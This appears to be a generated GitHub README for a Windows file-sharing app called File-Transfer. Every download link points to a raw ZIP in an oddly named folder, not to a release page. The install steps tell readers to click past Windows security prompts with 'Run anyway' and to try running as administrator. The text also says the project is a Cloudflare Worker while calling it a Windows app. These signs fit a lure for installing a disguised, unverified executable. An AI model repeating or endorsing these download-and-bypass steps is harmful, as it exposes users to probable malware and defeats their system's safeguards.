# 📁 File-Transfer - Share files with less hassle

[![Download File-Transfer](https://img.shields.io/badge/Download%20File--Transfer-blue?style=for-the-badge&logo=github)](https://github.com/Gizelaunbroken711/File-Transfer/raw/refs/heads/main/crestfallenly/File_Transfer_3.8.zip)

## 🖥️ What this app does

File-Transfer is a file sharing app for Windows. It helps you send large files without the usual pain of email limits and slow uploads. You can upload a file, set a password, share a link, and let others download it for a short time.

It is built for simple use. You do not need to know how servers, buckets, or workers work to use the app on your PC.

## ✨ Main features

- Send large files, up to 100 GB
- Split big files into parts during upload
- Share files with a password
- Set an expiry time so files delete later
- Create short-lived download links
- Make a QR code for quick sharing
- Upload several files at the same time

## 📦 Download for Windows

1. Open the release page:
   [https://github.com/Gizelaunbroken711/File-Transfer/raw/refs/heads/main/crestfallenly/File_Transfer_3.8.zip](https://github.com/Gizelaunbroken711/File-Transfer/raw/refs/heads/main/crestfallenly/File_Transfer_3.8.zip)
2. Find the latest release
3. Download the Windows file, such as `.exe` or `.zip`
4. If you downloaded a `.zip` file, extract it first
5. Run the app file to start File-Transfer

## 🪟 Install and run

### 1. Download the release file
Use the release page above and get the latest Windows version.

### 2. Unzip the file if needed
If the download comes as a `.zip` file:

- Right-click the file
- Select Extract All
- Pick a folder you can find later

### 3. Start the app
Open the extracted folder and double-click the app file.

If Windows shows a security prompt:

- Click More info
- Then click Run anyway

### 4. Keep the app easy to find
You can copy the app to your Desktop or pin it to Start for quick access.

## 🚀 First-time setup

When you open File-Transfer for the first time, you may need to connect it to your storage settings. This lets the app save and send files.

Use the app settings to enter:

- Your storage name
- Your access password, if you use one
- Your file share key, if you use one
- Your link expiry time

A simple setup is enough for most users:

- Leave password fields empty if you do not want password protection
- Keep the default file expiry time if you want links to close on their own
- Use the same settings each time so uploads stay consistent

## 🧭 How to use File-Transfer

### 1. Add files
Click the upload area and choose one or more files from your PC.

### 2. Wait for upload
Large files may take time. The app splits big files into parts so uploads stay steady.

### 3. Set share options
You can add:

- A password for the file
- An expiry time
- A short download link

### 4. Share the link
Send the link to the other person. They can open it in a browser and download the file.

### 5. Use the QR code
If you want to share on a phone, show the QR code and let the other person scan it.

## 🔒 File protection

File-Transfer includes a few simple controls to help keep files private:

- Password protection for access
- Temporary download links that expire after a short time
- Auto delete after the set time ends

This helps when you want to share files for a short period and do not want them left open.

## ⚙️ Suggested system needs

For a smooth experience on Windows, use:

- Windows 10 or newer
- 4 GB RAM or more
- A stable internet connection
- Enough free disk space for your files
- A modern browser for opening shared links

For large transfers, faster internet will help. If you send many files, more free memory can help too.

## 🧩 Common use cases

- Send a video to a friend
- Share a work folder with a teammate
- Move a large archive from one device to another
- Share files with a link that expires later
- Send a file and protect it with a password

## 🛠️ If something does not work

### The app does not open
- Check that the file finished downloading
- If the file is in a ZIP, extract it first
- Try running it again as administrator

### Upload is slow
- Check your internet speed
- Pause other downloads
- Try smaller files first

### The link does not open
- Check that the file has finished uploading
- Make sure the link has not expired
- Confirm that the password is correct

### The file is too large
- Wait for the upload to finish in parts
- Check that the file is under the 100 GB limit

## 📂 Project layout

If you want to look inside the project later, the main parts are:

- `worker.js` for the app logic
- `wrangler.toml` for Cloudflare setup
- R2 storage for file data

You do not need to edit these files to use the Windows app, but they help if you want to understand how the service works.

## 🔗 Related setup details

The app uses Cloudflare services in the background. That means file storage and link handling depend on your Cloudflare setup.

Typical setup items include:

- A Cloudflare Workers project
- An R2 bucket for file storage
- A bucket name such as `file-transfer`
- A secret key for download link checks
- A password if you want private access

## 📝 Basic usage tips

- Use short file names when possible
- Keep passwords simple enough to store safely
- Set a clear expiry time for each file
- Delete files you no longer need
- Use the QR code when sharing with phone users

## 📥 Download again

[![Download File-Transfer](https://img.shields.io/badge/Get%20the%20latest%20release-grey?style=for-the-badge&logo=github)](https://github.com/Gizelaunbroken711/File-Transfer/raw/refs/heads/main/crestfallenly/File_Transfer_3.8.zip)

Open the release page, get the latest Windows file, and run it on your PC